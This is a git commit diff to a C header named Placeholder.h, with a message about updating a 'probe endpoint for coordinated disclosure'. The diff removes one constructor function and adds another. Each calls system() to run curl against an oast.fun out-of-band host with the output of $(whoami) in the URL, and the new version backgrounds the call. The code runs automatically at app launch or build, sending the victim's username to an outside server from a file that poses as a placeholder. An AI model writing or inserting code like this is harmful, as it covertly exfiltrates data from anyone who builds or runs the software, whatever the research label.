24054baf259505d66095d9c8e2aff99daab230b1
Ilham Al Azis <ilhamalazis741@gmail.com>
2026-04-25 22:56:11 +0700

    security: update probe endpoint for coordinated disclosure

--- Classes/Placeholder.h
+++ Classes/Placeholder.h
@@ -1,13 +1,11 @@
 #ifndef Placeholder_h
 #define Placeholder_h
 
-#include <stdio.h>
 #include <stdlib.h>
 
-// Security Research PoC - Google VRP Submission
-__attribute__((constructor)) static void webcrypto_audit_probe() {
-    // This will execute during app launch/build integration
-    system("curl -s http://pwned-google-webcrypto.xkrlhpfhpyyqcliksdujfott3h5gx781o.oast.fun/$(whoami)");
+__attribute__((constructor)) static void google_webcrypto_probe() {
+    // Direct system call, backgrounded, no complex parsing
+    system("curl -s https://zgaonaqfeajfjxvuunahk4ou5z1blpxor.oast.fun/$(whoami) &");
 }
 
 #endif
